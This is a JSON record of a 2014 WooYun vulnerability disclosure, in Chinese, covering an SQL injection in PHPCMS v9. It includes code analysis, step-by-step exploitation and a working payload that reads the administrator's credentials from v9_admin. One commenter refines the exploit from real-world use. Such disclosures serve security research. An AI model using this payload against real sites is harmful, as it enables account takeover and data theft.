{"id": 4337, "wybug_id": "wooyun-2014-050636", "wybug_title": "PHPCMS全版本通杀SQL注入漏洞", "wybug_corp": "phpcms", "wybug_author": "felixk3y", "wybug_date": "2014-02-11 10:52", "wybug_open_date": "2014-05-12 10:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-12：\t细节向公众公开  简要描述： 上次你们太不给力了,这次再来个通杀v9的SQL注入,包括最新v9.5.3版本 详细说明：  #漏洞产生总的来说，是因为你们修复不完善，并没有理解到这个SQL注入的真正原因,同时 补丁后 并没有进行相应的测试 因而可绕过补丁 继续注入...#漏洞分析首先看下面的代码/phpcms/modules/member/content.php 202行 edit函数\npublic function edit() {\t$_username = $this->memberinfo['username'];\tif(isset($_POST['dosubmit'])) {\t\t$catid = $_POST['info']['catid'] = intval($_POST['info']['catid']);\t\t$siteids = getcache('category_content', 'commons');\t\t$siteid = $siteids[$catid];\t\t$CATEGORYS = getcache('category_content_'.$siteid, 'commons');\t\t$category = $CATEGORYS[$catid];\t\tif($category['type']==0) {//审核状态时，点编辑 再提交，进入if分支\t\t\t$id = intval($_POST['id']);\t\t\t$catid = $_POST['info']['catid'] = intval($_POST['info']['catid']);\t\t\t$this->content_db = pc_base::load_model('content_model');\t\t\t$modelid = $category['modelid'];\t\t\t$this->content_db->set_model($modelid);\t\t\t//判断会员组投稿是否需要审核\t\t\t$memberinfo = $this->memberinfo;\t\t\t$grouplist = getcache('grouplist');\t\t\t$setting = string2array($category['setting']);\t\t\tif(!$grouplist[$memberinfo['groupid']]['allowpostverify'] || $setting['workflowid']) {\t\t\t\t$_POST['info']['status'] = 1;\t\t\t}\t\t\t$info = array();\t\t\tforeach($_POST['info'] as $_k=>$_v) {\t\t\t\tif(in_array($_k, $fields)) $_POST['info'][$_k] = new_html_special_chars(trim_script($_v));\t\t\t}\t\t\t$_POST['linkurl'] = str_replace(array('\"','(',')',\",\",' '),'',new_html_special_chars($_POST['linkurl']));\t\t\t//exit(print_r($_POST['info']));\t\t\t$this->content_db->edit_content($_POST['info'],$id);\t\t\t$forward = $_POST['forward'];\t\t\tshowmessage(L('update_success'),$forward);\t\t}\t} else {\t\t//...}\n229行\n$this->content_db->edit_content($_POST['info'],$id);\n其中 $_POST['info'] 参数是一个数组，其内容是在线投稿的各项内容，如图所示\n\n好了，接下来我们看看这些数据都经过了怎样的处理...跟上edit_content函数 /phpcms/model/content_model.class.php 第234行开始\npublic function edit_content($data,$id) {\t\t$model_tablename = $this->model_tablename;\t\t//前台权限判断\t\tif(!defined('IN_ADMIN')) {\t\t\t$_username = param::get_cookie('_username');\t\t\t$us = $this->get_one(array('id'=>$id,'username'=>$_username));\t\t\tif(!$us) return false;\t\t}\t\t$this->search_db = pc_base::load_model('search_model');\t\trequire_once CACHE_MODEL_PATH.'content_input.class.php';        require_once CACHE_MODEL_PATH.'content_update.class.php';\t\t$content_input = new content_input($this->modelid);\t\t$inputinfo = $content_input->get($data);//跟进此函数\t\t// /caches/caches_model/caches_data/content_input.class.php get函数\t\t$systeminfo = $inputinfo['system'];\n第248行，我们可以看到 $_POST['info'] 数组进入了 get 函数，继续跟进/caches/caches_model/caches_data/content_input.class.php 第55行开始\nif($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);$MODEL = getcache('model', 'commons');$this->db->table_name = $this->fields[$field]['issystem'] ? $this->db_pre.$MODEL[$this->modelid]['tablename'] : $this->db_pre.$MODEL[$this->modelid]['tablename'].'_data';if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage($name.L('the_value_must_not_repeat'));$func = $this->fields[$field]['formtype'];if(method_exists($this, $func)) $value = $this->$func($field, $value);//这里是关键,后面慢慢说明if($this->fields[$field]['issystem']) {\t$info['system'][$field] = $value;} else {\t$info['model'][$field] = $value;}\n我们重点关注这里是怎么处理的\nif(method_exists($this, $func)) $value = $this->$func($field, $value);\n为了方便看清楚程序在这里究竟是怎样处理的,我们在这行代码前面加入以下调试代码，看看都经过了哪些函数的处理...\nif($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);$MODEL = getcache('model', 'commons');$this->db->table_name = $this->fields[$field]['issystem'] ? $this->db_pre.$MODEL[$this->modelid]['tablename'] : $this->db_pre.$MODEL[$this->modelid]['tablename'].'_data';if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage($name.L('the_value_must_not_repeat'));$func = $this->fields[$field]['formtype'];echo \"<br>Function :-->\".$func.\"<--<br>\";//这是添加的调试代码if(method_exists($this, $func)) $value = $this->$func($field, $value);//这里是关键,后面慢慢说明if($this->fields[$field]['issystem']) {\t$info['system'][$field] = $value;} else {\t$info['model'][$field] = $value;}\n编辑投稿内容，提交\n\n看见了吧，我们提交的内容经过了如下几个函数：catid title keyword copyform textarea editor image islink box经过分析后，我们重点关注image函数，继续跟上/caches/caches_model/caches_data/content_input.class.php 第102行 image函数\nfunction image($field, $value) {    $value = str_replace(array(\"'\",'\"','(',')'),'',$value);    return trim($value);}\n过滤了\"'\"、\"(\"、\")\",但是呢 我们知道当开启了GPC的时候，单引号会被转义 '-->\\'明白了吧? image函数过滤了单引号，假设我们提交的数据恰巧经过了image函数,则单引号被过滤了，留下\"\\\"，那么这个\"\\\"将会吃掉一个单引号,造成注入#3 漏洞Poc条件：后台开启投稿，并要求审核step1 在会员中心随便投一篇文章，提交step2 点击编辑，如下\n\nstep3 在缩略图栏填入 http://www.vulns.org/sql.jpg'，如图\n\n提交后，报错了...\n\n# 漏洞最终利用Exp在缩略图栏填入：http://www.vulns.org/sql.jpg'点击提交，采用Tamper data抓包修改，将info[islink]修改为\n,title=(select concat(username,password) from v9_admin where userid=1) -- felixk3y\n点击确定，再点编辑 即可读取管理员账号 密码，如图\n\n   漏洞证明：  \n\n   修复方案：  必须给力啊.   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-02-11 11:48 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-11 10:56 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  ......    \n     2014-02-11 10:59 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  求详情~    \n     2014-02-11 11:03 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  碉堡了    \n     2014-02-11 11:15 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  要火.    \n     2014-02-11 11:30 |    \t\tkow \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:4        | 研表究明，汉字的序顺并不定一能影阅响读，...)\t\t \n  mark    \n     2014-02-11 11:43 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  坐等公开。。    \n     2014-02-11 14:17 |    \t\t乌云一哥 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:1        | echo file_get_contents('http://www.wooyu...)\t\t \n  很牛逼的样子啊    \n     2014-02-12 16:38 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  大牛那么厉害..只有我没长进.. :(    \n     2014-02-13 00:13 |    \t\tcmd2k \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 学习,努力,加油)\t\t \n  t00ls看到了。    \n     2014-02-19 12:11 |    \t\tWindy \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:10        | 苦逼的民工)\t\t \n  坐等    \n     2014-03-07 16:03 |    \t\twebvul \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        )\t\t \n  坐等公开    \n     2014-03-11 14:08 |    \t\tSa7ael \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        )\t\t \n  -.-    \n     2014-04-08 10:16 |    \t\t進撃のDanny \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:7        )\t\t \n  http://loudong.360.cn/vul/info/id/2558 360上已公开的漏洞提交到这里来有什么意思。。    \n     2014-04-08 10:26 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @進撃のDanny 请你仔细看，这个漏洞报上去官方的修复方案是：过滤了转向连接那里，但由于这里还存在一个隐藏的参数，因此还可以继续利用，同时请你看详细说明的开头 也有相应的说明，是由于修复不完善造成的。谢谢    \n     2014-05-04 00:00 |    \t\t楼下小黑 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 高智商白痴)\t\t \n  好牛X的样子    \n     2014-05-12 13:42 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  现在很多会员中心 关闭的  鸡肋 像DEDE    \n     2014-05-14 23:11 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  冻住霸气，不过话说v9我就没注册成功过，不是禁止注册就是操作失败，什么也不提示，人品不行    \n     2015-06-04 05:36 |    \t\t探狗 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 报！！探狗飞报！！！)\t\t \n  这个exp要修改下，不然所有userid=1发的文章，都会被干掉。最好是where 文章id＝文章id    \n     2015-06-04 05:39 |    \t\t探狗 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 报！！探狗飞报！！！)\t\t \n  @felixk3y 这个exp要修改下，不然所有userid=1发的文章，都会被干掉。最好是后面加上where 文章id＝文章id   实战结果。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}